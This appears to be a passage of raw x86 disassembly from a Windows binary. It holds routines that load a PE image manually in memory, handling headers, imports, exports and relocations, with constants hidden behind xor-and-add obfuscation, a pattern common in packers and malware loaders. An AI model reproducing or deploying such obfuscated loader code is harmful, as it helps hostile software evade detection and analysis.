  417dee:	mov    edx,DWORD PTR [eax+0x4]
  417df1:	mov    DWORD PTR [ebp-0xc],edx
  417df4:	test   edx,edx
  417df6:	jne    0x417d74
  417dfc:	mov    eax,DWORD PTR [ebp-0x10]
  417dff:	mov    DWORD PTR [ebp-0x6c],eax
  417e02:	mov    DWORD PTR [ebp-0x70],0x4
  417e09:	mov    eax,DWORD PTR [ecx+0x50]
  417e0c:	mov    DWORD PTR [ebp-0x68],eax
  417e0f:	mov    eax,DWORD PTR [ebp-0x1c]
  417e12:	xor    eax,esi
  417e14:	add    eax,edi
  417e16:	mov    DWORD PTR [ebp-0x64],eax
  417e19:	lea    eax,[ebp-0x20]
  417e1c:	mov    DWORD PTR [ebp-0x60],eax
  417e1f:	lea    eax,[ebp-0x70]
  417e22:	push   eax
  417e23:	mov    eax,DWORD PTR [ebp+0x8]
  417e26:	xor    eax,esi
  417e28:	add    eax,edi
  417e2a:	push   eax
  417e2b:	mov    eax,DWORD PTR [ebp+0x20]
  417e2e:	add    eax,0xee
  417e33:	push   eax
  417e34:	mov    eax,DWORD PTR [ebp+0x20]
  417e37:	mov    eax,DWORD PTR [eax+0x198]
  417e3d:	push   DWORD PTR [eax]
  417e3f:	mov    eax,DWORD PTR [ebp+0x10]
  417e42:	call   eax
  417e44:	mov    eax,DWORD PTR [ebp+0x20]
  417e47:	mov    eax,DWORD PTR [eax+0x180]
  417e4d:	add    eax,DWORD PTR [ebp+0xc]
  417e50:	mov    ecx,DWORD PTR [ebp+0xc]
  417e53:	push   DWORD PTR [ebp+0x18]
  417e56:	mov    DWORD PTR [eax],ecx
  417e58:	push   DWORD PTR [ebp+0x14]
  417e5b:	push   DWORD PTR [ebp+0x1c]
  417e5e:	call   ebx
  417e60:	mov    ecx,DWORD PTR [ebp+0xc]
  417e63:	add    ecx,DWORD PTR [ebp+0x20]
  417e66:	lea    eax,[ebp+0x4]
  417e69:	mov    DWORD PTR [ebp+0x20],ecx
  417e6c:	mov    ecx,DWORD PTR [ebp+0x20]
  417e6f:	mov    ecx,DWORD PTR [ebp+0x20]
  417e72:	mov    edx,DWORD PTR [ecx+0x190]
  417e78:	mov    ecx,DWORD PTR [ebp+0x20]
  417e7b:	mov    ecx,DWORD PTR [ecx+0x18c]
  417e81:	mov    esi,DWORD PTR [ecx]
  417e83:	cmp    DWORD PTR [eax],esi
  417e85:	jb     0x417ea6
  417e87:	mov    esi,DWORD PTR [edx]
  417e89:	mov    edi,DWORD PTR [edx]
  417e8b:	mov    esi,DWORD PTR [esi+0x3c]
  417e8e:	lea    esi,[edi+esi*1+0x50]
  417e92:	mov    edi,DWORD PTR [ecx]
  417e94:	add    edi,DWORD PTR [esi]
  417e96:	cmp    DWORD PTR [eax],edi
  417e98:	jae    0x417ea6
  417e9a:	mov    esi,DWORD PTR [ecx]
  417e9c:	mov    ecx,DWORD PTR [eax]
  417e9e:	mov    edx,DWORD PTR [edx]
  417ea0:	sub    ecx,esi
  417ea2:	add    edx,ecx
  417ea4:	mov    DWORD PTR [eax],edx
  417ea6:	mov    eax,DWORD PTR [ebp+0xc]
  417ea9:	jmp    0x417ead
  417eab:	xor    eax,eax
  417ead:	pop    edi
  417eae:	pop    esi
  417eaf:	pop    ebx
  417eb0:	leave  
  417eb1:	ret    0x1c
  417eb4:	push   ebp
  417eb5:	mov    ebp,esp
  417eb7:	sub    esp,0x1c
  417eba:	push   esi
  417ebb:	mov    esi,eax
  417ebd:	mov    eax,DWORD PTR [ecx+0x190]
  417ec3:	cmp    DWORD PTR [eax],0x0
  417ec6:	je     0x417fd6
  417ecc:	test   edx,edx
  417ece:	je     0x417fd6
  417ed4:	test   esi,esi
  417ed6:	je     0x417fd6
  417edc:	mov    eax,DWORD PTR [esi+0x88]
  417ee2:	test   eax,eax
  417ee4:	je     0x417fd1
  417eea:	cmp    DWORD PTR [esi+0x8c],0x10
  417ef1:	je     0x417fd1
  417ef7:	cmp    DWORD PTR [esi+0x34],edx
  417efa:	je     0x417fd1
  417f00:	mov    esi,DWORD PTR [ecx+0x18c]
  417f06:	and    DWORD PTR [ebp-0x10],0x0
  417f0a:	mov    ecx,edx
  417f0c:	sub    ecx,DWORD PTR [esi]
  417f0e:	add    eax,edx
  417f10:	movzx  edx,WORD PTR [eax+0xc]
  417f14:	mov    DWORD PTR [ebp-0x1c],ecx
  417f17:	movzx  ecx,WORD PTR [eax+0xe]
  417f1b:	add    ecx,edx
  417f1d:	je     0x417fd1
  417f23:	lea    ecx,[eax+0x14]
  417f26:	push   ebx
  417f27:	mov    DWORD PTR [ebp-0x18],ecx
  417f2a:	mov    esi,0x7fffffff
  417f2f:	push   edi
  417f30:	test   DWORD PTR [ecx],esi
  417f32:	je     0x417fb3
  417f34:	mov    edx,DWORD PTR [ecx]
  417f36:	and    DWORD PTR [ebp-0xc],0x0
  417f3a:	and    edx,esi
  417f3c:	add    edx,eax
  417f3e:	movzx  edi,WORD PTR [edx+0xe]
  417f42:	movzx  ebx,WORD PTR [edx+0xc]
  417f46:	add    edi,ebx
  417f48:	je     0x417fb3
  417f4a:	lea    ecx,[edx+0x14]
  417f4d:	mov    DWORD PTR [ebp-0x14],ecx
  417f50:	test   DWORD PTR [ecx],esi
  417f52:	je     0x417f95
  417f54:	mov    ecx,DWORD PTR [ecx]
  417f56:	and    DWORD PTR [ebp-0x8],0x0
  417f5a:	and    ecx,esi
  417f5c:	add    ecx,eax
  417f5e:	movzx  edi,WORD PTR [ecx+0xe]
  417f62:	movzx  ebx,WORD PTR [ecx+0xc]
  417f66:	add    edi,ebx
  417f68:	je     0x417f95
  417f6a:	lea    edi,[ecx+0x14]
  417f6d:	mov    DWORD PTR [ebp-0x4],edi
  417f70:	mov    edi,DWORD PTR [ebp-0x4]
  417f73:	mov    edi,DWORD PTR [edi]
  417f75:	test   edi,edi
  417f77:	je     0x417f7f
  417f79:	mov    ebx,DWORD PTR [ebp-0x1c]
  417f7c:	add    DWORD PTR [edi+eax*1],ebx
  417f7f:	movzx  edi,WORD PTR [ecx+0xe]
  417f83:	movzx  ebx,WORD PTR [ecx+0xc]
  417f87:	inc    DWORD PTR [ebp-0x8]
  417f8a:	add    DWORD PTR [ebp-0x4],0x8
  417f8e:	add    edi,ebx
  417f90:	cmp    DWORD PTR [ebp-0x8],edi
  417f93:	jb     0x417f70
  417f95:	movzx  edi,WORD PTR [edx+0xe]
  417f99:	movzx  ebx,WORD PTR [edx+0xc]
  417f9d:	mov    ecx,DWORD PTR [ebp-0x14]
  417fa0:	inc    DWORD PTR [ebp-0xc]
  417fa3:	add    ecx,0x8
  417fa6:	add    edi,ebx
  417fa8:	mov    DWORD PTR [ebp-0x14],ecx
  417fab:	cmp    DWORD PTR [ebp-0xc],edi
  417fae:	jb     0x417f50
  417fb0:	mov    ecx,DWORD PTR [ebp-0x18]
  417fb3:	movzx  edx,WORD PTR [eax+0xe]
  417fb7:	movzx  edi,WORD PTR [eax+0xc]
  417fbb:	inc    DWORD PTR [ebp-0x10]
  417fbe:	add    ecx,0x8
  417fc1:	add    edx,edi
  417fc3:	mov    DWORD PTR [ebp-0x18],ecx
  417fc6:	cmp    DWORD PTR [ebp-0x10],edx
  417fc9:	jb     0x417f30
  417fcf:	pop    edi
  417fd0:	pop    ebx
  417fd1:	xor    eax,eax
  417fd3:	inc    eax
  417fd4:	jmp    0x417fd8
  417fd6:	xor    eax,eax
  417fd8:	pop    esi
  417fd9:	leave  
  417fda:	ret    
  417fdb:	push   ebp
  417fdc:	mov    ebp,esp
  417fde:	mov    ecx,DWORD PTR [ecx+0x190]
  417fe4:	mov    eax,DWORD PTR [ebp+0xc]
  417fe7:	sub    esp,0x10
  417fea:	push   ebx
  417feb:	xor    ebx,ebx
  417fed:	push   esi
  417fee:	push   edi
  417fef:	cmp    DWORD PTR [ecx],ebx
  417ff1:	je     0x418079
  417ff7:	cmp    eax,ebx
  417ff9:	je     0x418079
  417ffb:	cmp    DWORD PTR [eax+0x78],ebx
  417ffe:	jne    0x418005
  418000:	xor    eax,eax
  418002:	inc    eax
  418003:	jmp    0x41807b
  418005:	mov    eax,DWORD PTR [eax+0x78]
  418008:	add    eax,DWORD PTR [ebp+0x8]
  41800b:	mov    ecx,DWORD PTR [eax+0x1c]
  41800e:	mov    edx,DWORD PTR [eax+0x24]
  418011:	mov    esi,DWORD PTR [eax+0x14]
  418014:	mov    edi,DWORD PTR [eax+0x18]
  418017:	add    ecx,DWORD PTR [ebp+0x8]
  41801a:	add    edx,DWORD PTR [ebp+0x8]
  41801d:	mov    DWORD PTR [ebp-0x4],esi
  418020:	cmp    esi,edi
  418022:	ja     0x418027
  418024:	mov    DWORD PTR [ebp-0x4],edi
  418027:	mov    DWORD PTR [ebp-0x8],ebx
  41802a:	cmp    DWORD PTR [ebp-0x4],ebx
  41802d:	jbe    0x418000
  41802f:	cmp    ebx,DWORD PTR [eax+0x14]
  418032:	jae    0x41803a
  418034:	movzx  esi,WORD PTR [edx+ebx*2]
  418038:	jmp    0x41803c
  41803a:	mov    esi,ebx
  41803c:	lea    esi,[ecx+esi*4]
  41803f:	mov    edi,DWORD PTR [esi]
  418041:	test   edi,edi
  418043:	je     0x41806e
  418045:	add    edi,DWORD PTR [ebp+0x8]
  418048:	mov    DWORD PTR [ebp-0x10],edi
  41804b:	cmp    edi,eax
  41804d:	jbe    0x41805f
  41804f:	mov    ebx,DWORD PTR [ebp+0xc]
  418052:	mov    ebx,DWORD PTR [ebx+0x7c]
  418055:	add    ebx,eax
  418057:	cmp    edi,ebx
  418059:	jae    0x41805f
  41805b:	mov    esi,DWORD PTR [esi]
  41805d:	jmp    0x418067
  41805f:	sub    edi,DWORD PTR [ebp+0x8]
  418062:	mov    DWORD PTR [esi],edi
  418064:	mov    esi,DWORD PTR [ebp-0x10]
  418067:	test   esi,esi
  418069:	je     0x418079
  41806b:	mov    ebx,DWORD PTR [ebp-0x8]
  41806e:	inc    ebx
  41806f:	mov    DWORD PTR [ebp-0x8],ebx
  418072:	cmp    ebx,DWORD PTR [ebp-0x4]
  418075:	jb     0x41802f
  418077:	jmp    0x418000
  418079:	xor    eax,eax
  41807b:	pop    edi
  41807c:	pop    esi
  41807d:	pop    ebx
  41807e:	leave  
  41807f:	ret    0x8
  418082:	push   ebp
  418083:	mov    ebp,esp
  418085:	sub    esp,0x2c
  418088:	mov    edx,0xf89c8585
  41808d:	mov    DWORD PTR [ebp-0x4],edx
  418090:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418097:	mov    eax,DWORD PTR [ebp-0x4]
  41809a:	mov    ecx,DWORD PTR [ebp-0x4]
  41809d:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a9:	push   ebx
  4180aa:	mov    ebx,DWORD PTR [ebp+0x10]
  4180ad:	push   esi
  4180ae:	mov    esi,0x751089b
  4180b3:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4180ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4180bd:	mov    ebx,DWORD PTR [ebx+0x190]
  4180c3:	push   edi
  4180c4:	mov    edi,0x3272e2
  4180c9:	xor    ecx,esi
  4180cb:	xor    eax,esi
  4180cd:	add    eax,edi
  4180cf:	add    ecx,edi
  4180d1:	mov    DWORD PTR [ebp-0x18],eax
  4180d4:	cmp    ecx,DWORD PTR [ebx]
  4180d6:	je     0x418357
  4180dc:	mov    ebx,DWORD PTR [ebp-0x4]
  4180df:	mov    ecx,DWORD PTR [ebp+0xc]
  4180e2:	xor    ebx,esi
  4180e4:	add    ebx,edi
  4180e6:	cmp    ebx,ecx
  4180e8:	je     0x418357
  4180ee:	mov    ebx,DWORD PTR [ebp-0x4]
  4180f1:	mov    ecx,DWORD PTR [ecx+0x80]
  4180f7:	xor    ebx,esi
  4180f9:	add    ebx,edi
  4180fb:	cmp    ecx,ebx
  4180fd:	je     0x418352
  418103:	add    ecx,DWORD PTR [ebp+0x8]
  418106:	mov    DWORD PTR [ebp-0x2c],ecx
  418109:	mov    ebx,edx
  41810b:	xor    ebx,esi
  41810d:	add    ebx,edi
  41810f:	mov    DWORD PTR [ebp-0x10],ebx
  418112:	mov    ebx,DWORD PTR [ebp-0x10]
  418115:	cmp    ebx,edx
  418117:	je     0x41812b
  418119:	mov    edx,DWORD PTR [ebp-0x10]
  41811c:	mov    ebx,DWORD PTR [ebp-0x4]
  41811f:	imul   edx,edx,0x14
  418122:	xor    ebx,esi
  418124:	add    ebx,edi
  418126:	cmp    DWORD PTR [edx+ecx*1],ebx
  418129:	jne    0x418142
  41812b:	mov    edx,DWORD PTR [ebp-0x10]
  41812e:	mov    ebx,DWORD PTR [ebp-0x4]
  418131:	imul   edx,edx,0x14
  418134:	xor    ebx,esi
  418136:	add    ebx,edi
  418138:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41813c:	je     0x418344
  418142:	mov    eax,DWORD PTR [ebp-0x4]
  418145:	mov    ebx,DWORD PTR [ebp-0x4]
  418148:	mov    eax,DWORD PTR [ebp-0x10]
  41814b:	imul   eax,eax,0x14
  41814e:	add    eax,ecx
  418150:	mov    ecx,DWORD PTR [eax+0x10]
  418153:	add    ecx,DWORD PTR [ebp+0x8]
  418156:	xor    ebx,esi
  418158:	mov    DWORD PTR [ebp-0x1c],ecx
  41815b:	mov    ecx,DWORD PTR [ebp-0x4]
  41815e:	mov    edx,DWORD PTR [ebp-0x4]
  418161:	xor    ecx,esi
  418163:	add    ecx,edi
  418165:	xor    edx,esi
  418167:	mov    DWORD PTR [ebp-0x24],ecx
  41816a:	mov    ecx,DWORD PTR [eax]
  41816c:	add    edx,edi
  41816e:	add    ebx,edi
  418170:	cmp    ecx,edx
  418172:	je     0x41817a
  418174:	add    ecx,DWORD PTR [ebp+0x8]
  418177:	mov    DWORD PTR [ebp-0x24],ecx
  41817a:	mov    ecx,DWORD PTR [ebp-0x4]
  41817d:	xor    ecx,esi
  41817f:	add    ecx,DWORD PTR [eax+0xc]
  418182:	mov    eax,DWORD PTR [ebp+0x8]
  418185:	lea    eax,[ecx+eax*1+0x3272e2]
  41818c:	mov    DWORD PTR [ebp+0xc],eax
  41818f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  418196:	mov    eax,DWORD PTR [ebp+0x10]
  418199:	push   DWORD PTR [ebp+0xc]
  41819c:	mov    eax,DWORD PTR [eax+0x1d8]
  4181a2:	call   DWORD PTR [eax]
  4181a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4181a7:	xor    ecx,esi
  4181a9:	add    ecx,edi
  4181ab:	mov    DWORD PTR [ebp-0xc],eax
  4181ae:	cmp    ecx,eax
  4181b0:	jne    0x4181c4
  4181b2:	mov    eax,DWORD PTR [ebp+0x10]
  4181b5:	push   DWORD PTR [ebp+0xc]
  4181b8:	mov    eax,DWORD PTR [eax+0x1d8]
  4181be:	call   DWORD PTR [eax+0xc]
  4181c1:	mov    DWORD PTR [ebp-0xc],eax
  4181c4:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  4181cb:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  4181d2:	mov    eax,DWORD PTR [ebp-0x4]
  4181d5:	xor    eax,esi
  4181d7:	add    eax,edi
  4181d9:	cmp    eax,DWORD PTR [ebp-0xc]
  4181dc:	jne    0x418201
  4181de:	mov    eax,DWORD PTR [ebp-0x8]
  4181e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4181e4:	xor    eax,esi
  4181e6:	xor    ecx,esi
  4181e8:	lea    ebx,[ebx+eax*1+0x3272e2]
  4181ef:	mov    eax,DWORD PTR [ebp+0x10]
  4181f2:	mov    eax,DWORD PTR [eax+0x1d8]
  4181f8:	add    ecx,edi
  4181fa:	imul   ecx,ebx
  4181fd:	push   ecx
  4181fe:	call   DWORD PTR [eax+0x24]
  418201:	mov    eax,DWORD PTR [ebp-0x4]
  418204:	xor    eax,esi
  418206:	add    eax,edi
  418208:	cmp    eax,DWORD PTR [ebp-0xc]
  41820b:	jne    0x41821c
  41820d:	mov    eax,DWORD PTR [ebp-0x28]
  418210:	xor    eax,esi
  418212:	add    eax,edi
  418214:	cmp    ebx,eax
  418216:	jbe    0x418196
  41821c:	mov    eax,DWORD PTR [ebp-0x4]
  41821f:	xor    eax,esi
  418221:	add    eax,edi
  418223:	cmp    eax,DWORD PTR [ebp-0xc]
  418226:	jne    0x41823f
  418228:	mov    eax,DWORD PTR [ebp-0x8]
  41822b:	mov    ecx,DWORD PTR [ebp-0x18]
  41822e:	xor    eax,esi
  418230:	lea    eax,[ecx+eax*1+0x3272e2]
  418237:	mov    DWORD PTR [ebp-0x18],eax
  41823a:	jmp    0x41832e
  41823f:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  418246:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41824d:	mov    ebx,DWORD PTR [ebp-0x4]
  418250:	xor    ebx,esi
  418252:	add    ebx,edi
  418254:	jmp    0x41831b
  418259:	mov    eax,DWORD PTR [ebp-0x4]
  41825c:	xor    eax,esi
  41825e:	add    eax,edi
  418260:	mov    DWORD PTR [ebp-0x14],eax
  418263:	mov    eax,DWORD PTR [ebp-0x4]
  418266:	xor    eax,esi
  418268:	add    eax,edi
  41826a:	mov    DWORD PTR [ebp+0xc],eax
  41826d:	mov    ecx,DWORD PTR [ebp-0x4]
  418270:	mov    eax,DWORD PTR [ebp-0x24]
  418273:	xor    ecx,esi
  418275:	add    ecx,edi
  418277:	cmp    ecx,eax
  418279:	je     0x418281
  41827b:	mov    eax,DWORD PTR [eax+ebx*4]
  41827e:	mov    DWORD PTR [ebp-0x14],eax
  418281:	mov    eax,DWORD PTR [ebp-0x1c]
  418284:	mov    eax,DWORD PTR [eax+ebx*4]
  418287:	mov    DWORD PTR [ebp+0xc],eax
  41828a:	mov    eax,DWORD PTR [ebp-0x4]
  41828d:	mov    ecx,DWORD PTR [ebp-0x14]
  418290:	xor    eax,esi
  418292:	add    eax,edi
  418294:	cmp    eax,ecx
  418296:	je     0x4182c1
  418298:	mov    eax,DWORD PTR [ebp-0x4]
  41829b:	mov    ecx,DWORD PTR [ebp-0x14]
  41829e:	xor    eax,esi
  4182a0:	add    eax,edi
  4182a2:	shr    ecx,0x1f
  4182a5:	cmp    eax,ecx
  4182a7:	je     0x4182c1
  4182a9:	mov    ecx,DWORD PTR [ebp-0x14]
  4182ac:	mov    eax,DWORD PTR [ebp+0x10]
  4182af:	mov    eax,DWORD PTR [eax+0x1d8]
  4182b5:	movzx  ecx,cx
  4182b8:	push   ecx
  4182b9:	push   DWORD PTR [ebp-0xc]
  4182bc:	call   DWORD PTR [eax+0x8]
  4182bf:	jmp    0x4182da
  4182c1:	mov    eax,DWORD PTR [ebp+0xc]
  4182c4:	add    eax,DWORD PTR [ebp+0x8]
  4182c7:	mov    ecx,DWORD PTR [ebp+0x10]
  4182ca:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4182d0:	add    eax,0x2
  4182d3:	push   eax
  4182d4:	push   DWORD PTR [ebp-0xc]
  4182d7:	call   DWORD PTR [ecx+0x8]
  4182da:	mov    DWORD PTR [ebp+0xc],eax
  4182dd:	mov    eax,DWORD PTR [ebp-0x4]
  4182e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4182e3:	xor    eax,esi
  4182e5:	add    eax,edi
  4182e7:	cmp    eax,ecx
  4182e9:	mov    eax,DWORD PTR [ebp-0x8]
  4182ec:	jne    0x4182ff
  4182ee:	mov    ecx,DWORD PTR [ebp-0x18]
  4182f1:	xor    eax,esi
  4182f3:	lea    eax,[ecx+eax*1+0x3272e2]
  4182fa:	mov    DWORD PTR [ebp-0x18],eax
  4182fd:	jmp    0x41830f
  4182ff:	mov    ecx,DWORD PTR [ebp+0xc]
  418302:	xor    eax,esi
  418304:	add    eax,edi
  418306:	imul   eax,ecx
  418309:	mov    ecx,DWORD PTR [ebp-0x1c]
  41830c:	mov    DWORD PTR [ecx+ebx*4],eax
  41830f:	mov    eax,DWORD PTR [ebp-0x8]
  418312:	xor    eax,esi
  418314:	lea    ebx,[ebx+eax*1+0x3272e2]
  41831b:	mov    eax,DWORD PTR [ebp-0x4]
  41831e:	mov    ecx,DWORD PTR [ebp-0x1c]
  418321:	xor    eax,esi
  418323:	add    eax,edi
  418325:	cmp    DWORD PTR [ecx+ebx*4],eax
  418328:	jne    0x418259
  41832e:	mov    edx,DWORD PTR [ebp-0x10]
  418331:	mov    eax,DWORD PTR [ebp-0x18]
  418334:	mov    ecx,DWORD PTR [ebp-0x2c]
  418337:	sub    edx,0x3272e1
  41833d:	xor    edx,esi
  41833f:	jmp    0x418109
  418344:	mov    ecx,DWORD PTR [ebp-0x4]
  418347:	xor    ecx,esi
  418349:	add    ecx,edi
  41834b:	cmp    eax,ecx
  41834d:	mov    eax,DWORD PTR [ebp-0x4]
  418350:	jne    0x41835a
  418352:	mov    eax,DWORD PTR [ebp-0x8]
  418355:	jmp    0x41835a
  418357:	mov    eax,DWORD PTR [ebp-0x4]
  41835a:	xor    eax,esi
  41835c:	add    eax,edi
  41835e:	pop    edi
  41835f:	pop    esi
  418360:	pop    ebx
  418361:	leave  
  418362:	ret    0xc
  418365:	push   ebp
  418366:	mov    ebp,esp
  418368:	sub    esp,0x28
  41836b:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418372:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  418379:	mov    eax,DWORD PTR [ebp+0xc]
  41837c:	mov    DWORD PTR [ebp+0xc],eax
  41837f:	push   esi
  418380:	mov    eax,eax
  418382:	mov    eax,DWORD PTR [ebp-0x4]
  418385:	mov    esi,DWORD PTR [ebp+0x8]
  418388:	mov    ecx,0x751089b
  41838d:	xor    eax,ecx
  41838f:	mov    edx,0x3272e2
  418394:	add    eax,edx
  418396:	cmp    esi,eax
  418398:	je     0x4184bf
  41839e:	mov    eax,DWORD PTR [ebp+0x8]
  4183a1:	mov    esi,DWORD PTR [ebp+0x8]
  4183a4:	add    esi,DWORD PTR [eax+0x3c]
  4183a7:	push   edi
  4183a8:	mov    DWORD PTR [ebp+0xc],esi
  4183ab:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  4183b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4183b5:	mov    esi,DWORD PTR [ebp-0x4]
  4183b8:	mov    edi,DWORD PTR [ebp+0xc]
  4183bb:	xor    esi,ecx
  4183bd:	xor    eax,ecx
  4183bf:	add    esi,edx
  4183c1:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  4183c8:	je     0x4184b9
  4183ce:	mov    esi,DWORD PTR [ebp+0xc]
  4183d1:	mov    eax,DWORD PTR [ebp+0x8]
  4183d4:	add    eax,DWORD PTR [esi+0xa0]
  4183da:	mov    esi,DWORD PTR [ebp+0x8]
  4183dd:	mov    edi,DWORD PTR [ebp+0xc]
  4183e0:	sub    esi,DWORD PTR [edi+0x34]
  4183e3:	mov    edi,DWORD PTR [ebp-0x4]
  4183e6:	xor    edi,ecx
  4183e8:	add    edi,edx
  4183ea:	mov    DWORD PTR [ebp-0x24],esi
  4183ed:	cmp    esi,edi
  4183ef:	je     0x4184b9
  4183f5:	mov    esi,DWORD PTR [ebp-0x4]
  4183f8:	xor    esi,ecx
  4183fa:	add    esi,edx
  4183fc:	mov    DWORD PTR [ebp-0x8],esi
  4183ff:	push   ebx
  418400:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  418407:	jmp    0x4184a3
  41840c:	mov    esi,DWORD PTR [ebp-0x4]
  41840f:	xor    esi,ecx
  418411:	lea    edi,[ebx-0x8]
  418414:	add    esi,edx
  418416:	shr    edi,1
  418418:	cmp    esi,edi
  41841a:	jae    0x418489
  41841c:	sub    edi,esi
  41841e:	lea    ebx,[eax+esi*2+0x8]
  418422:	mov    DWORD PTR [ebp-0x18],edi
  418425:	movzx  esi,WORD PTR [ebx]
  418428:	and    esi,0xfff
  41842e:	mov    DWORD PTR [ebp-0x14],esi
  418431:	mov    edi,DWORD PTR [ebp-0x14]
  418434:	mov    esi,DWORD PTR [eax]
  418436:	sub    esi,edx
  418438:	add    edi,esi
  41843a:	movzx  esi,WORD PTR [ebx]
  41843d:	shr    esi,0xc
  418440:	xor    edi,ecx
  418442:	mov    DWORD PTR [ebp-0x20],edi
  418445:	mov    DWORD PTR [ebp-0x14],esi
  418448:	mov    esi,DWORD PTR [ebp-0x20]
  41844b:	mov    edi,DWORD PTR [ebp+0x8]
  41844e:	xor    esi,ecx
  418450:	lea    esi,[esi+edi*1+0x3272e2]
  418457:	mov    DWORD PTR [ebp-0x20],esi
  41845a:	mov    esi,DWORD PTR [ebp-0x10]
  41845d:	mov    edi,DWORD PTR [ebp-0x14]
  418460:	xor    esi,ecx
  418462:	add    esi,edx
  418464:	cmp    edi,esi
  418466:	jne    0x41847e
  418468:	mov    esi,DWORD PTR [ebp-0x10]
  41846b:	mov    edi,DWORD PTR [ebp-0x14]
  41846e:	xor    esi,ecx
  418470:	add    esi,edx
  418472:	cmp    edi,esi
  418474:	jne    0x41847e
  418476:	mov    esi,DWORD PTR [ebp-0x20]
  418479:	mov    edi,DWORD PTR [ebp-0x24]
  41847c:	add    DWORD PTR [esi],edi
  41847e:	add    ebx,0x2
  418481:	dec    DWORD PTR [ebp-0x18]
  418484:	jne    0x418425
  418486:	mov    ebx,DWORD PTR [ebp-0xc]
  418489:	add    DWORD PTR [ebp-0x8],ebx
  41848c:	mov    esi,DWORD PTR [ebp-0x1c]
  41848f:	mov    edi,DWORD PTR [ebp-0x8]
  418492:	mov    ebx,DWORD PTR [ebp+0xc]
  418495:	xor    esi,ecx
  418497:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41849e:	jae    0x4184b8
  4184a0:	add    eax,DWORD PTR [ebp-0xc]
  4184a3:	mov    esi,DWORD PTR [ebp-0x4]
  4184a6:	mov    ebx,DWORD PTR [eax+0x4]
  4184a9:	xor    esi,ecx
  4184ab:	add    esi,edx
  4184ad:	mov    DWORD PTR [ebp-0xc],ebx
  4184b0:	cmp    ebx,esi
  4184b2:	jne    0x41840c
  4184b8:	pop    ebx
  4184b9:	mov    eax,DWORD PTR [ebp-0x28]
  4184bc:	pop    edi
  4184bd:	jmp    0x4184c2
  4184bf:	mov    eax,DWORD PTR [ebp-0x4]
  4184c2:	xor    eax,ecx
  4184c4:	add    eax,edx
  4184c6:	pop    esi
  4184c7:	leave  
  4184c8:	ret    0x8
  4184cb:	push   ebp
  4184cc:	mov    ebp,esp
  4184ce:	sub    esp,0xcc
  4184d4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  4184db:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  4184e2:	mov    eax,DWORD PTR [ebp-0x4]
  4184e5:	push   ebx
  4184e6:	push   esi
  4184e7:	mov    esi,0x751089b
  4184ec:	xor    eax,esi
  4184ee:	push   edi
  4184ef:	mov    edi,0x3272e2
  4184f4:	add    eax,edi
  4184f6:	mov    DWORD PTR [ebp-0x1c],eax
  4184f9:	mov    eax,DWORD PTR [ebp-0x4]
  4184fc:	xor    eax,esi
  4184fe:	add    eax,edi
  418500:	mov    DWORD PTR [ebp-0x8],eax
  418503:	mov    ebx,DWORD PTR [ebp+0x20]
  418506:	mov    eax,DWORD PTR [ebp-0x14]
  418509:	mov    ecx,DWORD PTR [ebp-0x14]
  41850c:	xor    eax,ecx
  41850e:	mov    DWORD PTR [ebp-0x14],eax
  418511:	add    DWORD PTR [ebp-0x14],0xf89cb585
  418518:	mov    eax,DWORD PTR [ebp-0xc]
  41851b:	mov    ecx,DWORD PTR [ebp-0xc]
  41851e:	xor    eax,ecx
  418520:	mov    DWORD PTR [ebp-0xc],eax
  418523:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41852a:	mov    eax,DWORD PTR [ebp-0x10]
  41852d:	mov    ecx,DWORD PTR [ebp-0x10]
  418530:	xor    eax,ecx
  418532:	mov    DWORD PTR [ebp-0x10],eax
  418535:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41853c:	mov    eax,DWORD PTR [ebp-0x20]
  41853f:	mov    ecx,DWORD PTR [ebp-0x20]
  418542:	xor    eax,ecx
  418544:	mov    DWORD PTR [ebp-0x20],eax
  418547:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41854e:	mov    eax,0x9471
  418553:	mov    WORD PTR [ebp+0x20],ax
  418557:	mov    eax,DWORD PTR [ebp+0x8]
  41855a:	test   eax,eax
  41855c:	je     0x4189b7
  418562:	mov    eax,DWORD PTR [ebp+0xc]
  418565:	test   eax,eax
  418567:	je     0x4189b7
  41856d:	mov    eax,DWORD PTR [ebp+0x18]
  418570:	test   eax,eax
  418572:	je     0x4189b7
  418578:	mov    ax,WORD PTR [ebp+0x20]
  41857c:	mov    ecx,0x8a8d
  418581:	xor    ax,cx
  418584:	mov    ecx,0x3b51
  418589:	add    ax,cx
  41858c:	mov    ecx,DWORD PTR [ebp+0x8]
  41858f:	cmp    WORD PTR [ecx],ax
  418592:	jne    0x4189b7
  418598:	mov    eax,DWORD PTR [ebp-0x4]
  41859b:	xor    eax,esi
  41859d:	add    eax,edi
  41859f:	mov    DWORD PTR [ebp-0x30],eax
  4185a2:	mov    eax,DWORD PTR [ebp-0x4]
  4185a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4185a8:	mov    eax,DWORD PTR [ebp+0x8]
  4185ab:	add    eax,DWORD PTR [ecx+0x3c]
  4185ae:	mov    DWORD PTR [ebp+0xc],eax
  4185b1:	mov    eax,DWORD PTR [eax+0x50]
  4185b4:	test   eax,eax
  4185b6:	je     0x4189b7
